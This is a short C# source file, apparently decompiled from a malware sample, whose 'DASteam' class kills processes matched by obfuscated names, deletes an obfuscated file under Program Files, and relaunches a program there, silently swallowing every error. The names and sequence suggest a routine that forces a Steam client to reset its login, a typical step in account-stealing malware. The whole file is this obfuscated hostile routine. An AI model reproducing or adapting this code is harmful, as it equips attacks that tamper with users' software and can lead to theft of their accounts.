using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DASteam
{
	public class FRCSTMLGINdll
	{
		public static void Mainz()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName.Contains(TGKKN.HOGCW("rcnFyMYM", "False")) | process.ProcessName.Contains(TGKKN.HOGCW("aqaipaMv", "False")))
					{
						process.Kill();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			double NENYO = 5.0;
			CCUKM.PHNUVDOK(ref NENYO);
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TGKKN.HOGCW("gpTAuKaTna/Cs4yqs6+YmqatwIaWsZC0uYdvwrerIA==", "False");
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			NENYO = 2.0;
			CCUKM.PHNUVDOK(ref NENYO);
			try
			{
				Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TGKKN.HOGCW("fI66sqCNl5nBpIGodLK3hSc=", "False"), (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
